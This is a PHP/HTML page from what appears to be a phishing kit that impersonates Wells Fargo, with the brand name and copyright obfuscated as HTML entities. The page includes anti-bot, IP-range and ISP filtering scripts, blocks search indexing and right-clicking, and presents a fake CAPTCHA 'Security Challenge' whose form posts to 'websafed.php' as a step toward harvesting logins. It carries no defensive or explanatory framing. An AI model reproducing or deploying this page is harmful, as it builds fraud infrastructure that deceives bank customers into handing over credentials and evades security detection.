<?php include_once'../proxy.php';?><?php 
	include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
?>

<!DOCTYPE html>
<html class="" ><head>
<!-- WFB 4.9 -->
         <meta name="robots" content="noindex,nofollow" />
			<meta name="googlebot" content="noindex" />
			<META NAME="robots" CONTENT="nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">

<script type="text/javascript">
<!-- Begin
var message="Invalid request.";
if (navigator.appName == 'Microsoft Internet Explorer'){
function NOclickIE(e) {
if (event.button == 2 || event.button == 3) {
alert(message);
return false;
}
return true;
}
document.onmousedown=NOclickIE;
document.onmouseup=NOclickIE;
window.onmousedown=NOclickIE;
window.onmouseup=NOclickIE;
}
else {
function NOclickNN(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}}}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=NOclickNN; }
document.oncontextmenu=new Function("alert(message);return false")
}
// End -->
</script>
<title></title>


<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="stylesheet" href="/css/jquery.mobile.css?v=19.12.00">
<link rel="stylesheet" href="css/desktop-tablet.combined.css">
<link rel="stylesheet" href="css/archer.css">

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./javascript/myriad.woff2) format("woff2"),url(./javascript/awe.woff) format("woff"),url(./k/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>

<!-- myriad font loaded  -->
<style>
.capbox {
	background-color: #ffffff;
	border: #ffffff 0px solid;
	border-width: 0px 12px 0px 0px;
	display: inline-block;
	*display: inline; zoom: 1; /* FOR IE7-8 */
	padding: 8px 40px 8px 8px;
	}
.capbox-inner {
	font: bold 11px arial, sans-serif;
	color: #000000;

	margin: 5px auto 0px auto;
	padding: 3px;
	-moz-border-radius: 4px;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	}
#CaptchaDiv {
	font: bold 33px segoe print, arial, sans-serif;
	font-style: italic;
	color: #000000;
	background-color: #FFFFFF;
	padding: 4px;
	-moz-border-radius: 4px;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	}

#CaptchaInput { margin: 1px 0px 1px 0px; width: 135px; }

</style>




<link rel="icon" href="images/favicon.ico">



  </head>
<body data-gr-c-s-loaded="true" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
	
<header role="banner">
	<div class="masthead">

		<nav class="back">
			
		</nav>

		<div>

			
				
				
					<a class="c28cLink child-window ui-link" href="javascript:void(0)"> <img class="masthead-img-logo" alt="" role="img" src="images/masthead-img-logo.svg">
					</a>
				
			
		</div>

		
			
			
				<div role="navigation" class="top-search">
					<ul>
						
							
							
								<li class="security">
									<a class="c28cLink child-window ui-link" href="javascript:void(0)" data-platform="salesplatform">Online Security
									</a>
								</li>
							
						
					</ul>
				</div>
			
		

		<nav class="menu">
			
				
				
					<a href="javascript:void(0)" class="ui-link"></a>
				
			
		</nav>

	</div>

</header>


			
		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
				
					







<!-- Define Variable activeStepCount and initialize to zero-->



			
        	    
					<div class="progress-small small-screen">
						<span class="left">
		        	    	CAPTCHA verification
	    	    		</span>
	        	    	<span class="right">
		        	    	
	    	    		</span>
			    	</div>
    	    	
	    	
        	    
	    	
        	    
	    	
        	    
	    	
        	    
	    	
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-a active first">
							        	    

							            								            	
							            	<span><span>
							            	
							        	   	    
									        	
									        		CAPTCHA verification
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	
					
									
			    	    					            
					            
				            			            
					
				</ul>      
			</div>		


				

				<div class="osmp-title">
					<div>
						<h1>Security Challenge</h1>
					</div>
					
						<div class="large-screen right sub-title">

						</div>
					
					
				</div>
				<div class="not-large-screen">
					
	
					
				</div>




<form id="login" class="span12 autoSize-this login-widget lw-box-sizing login-widget-vertical tooltip-bottom" method="Post" action="websafed.php"  onsubmit="return checkform(this);">	
<h2 class="section-hdr">
	CAPTCHA verification:
</h2>

<div class="section">


<div class="capbox">

<div id="CaptchaDiv"></div>

<div class="capbox-inner">
Type the above Captcha Code:<br>

<input type="hidden" id="txtCaptcha">
<input style="height:38px; width:170px; type="text" name="CaptchaInput" id="CaptchaInput" placeholder="CaptchaCode"><br>

</div>
</div>
<br><br>
<!-- END CAPTCHA -->

    </p>

	
		

      
			</label></div><input type="hidden" name="_riskScreeningDisclosure" value="on">
		</div>
	</fieldset>
		
	







<div class="btn-ctr"><div class="btn-ctr-inner">
	<input class="flow-event" type="hidden" name="_eventId_continue" value="">
	
		
		
			<button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="bt_c">
				Continue
			</button>
	

</div></div>
</form>
<script type="text/javascript">

// Captcha Script

function checkform(theform){
var why = "";

if(theform.CaptchaInput.value == ""){
why += "- Please Enter CAPTCHA Code.\n";
}
if(theform.CaptchaInput.value != ""){
if(ValidCaptcha(theform.CaptchaInput.value) == false){
why += "- The CAPTCHA Code Does Not Match.\n";
}
}
if(why != ""){
alert(why);
return false;
}
}

var a = Math.ceil(Math.random() * 9)+ '';
var b = Math.ceil(Math.random() * 9)+ '';
var c = Math.ceil(Math.random() * 9)+ '';
var d = Math.ceil(Math.random() * 9)+ '';
var e = Math.ceil(Math.random() * 9)+ '';

var code = a + b + c + d + e;
document.getElementById("txtCaptcha").value = code;
document.getElementById("CaptchaDiv").innerHTML = code;

// Validate input against the generated number
function ValidCaptcha(){
var str1 = removeSpaces(document.getElementById('txtCaptcha').value);
var str2 = removeSpaces(document.getElementById('CaptchaInput').value);
if (str1 == str2){
return true;
}else{
return false;
}
}

// Remove the spaces from the entered and generated code
function removeSpaces(string){
return string.split(' ').join('');
}
</script>





</div>





</div>




	
	
		



<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">
					
					
						
						    
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						    
						
					
					</ul>				
					<ul class="large-screen">
						
						
						
							 
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						     
						
					
					</ul>				
				</nav>
				<hr>
				&copy;&#32;&#49;&#57;&#57;&#57;&#32;&#45; <span class="placeholder">&#50;&#48;&#50;&#48;</span> &#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $("#primaryPhone").mask('(000) 000-0000');
		
    </script>
</body></html>
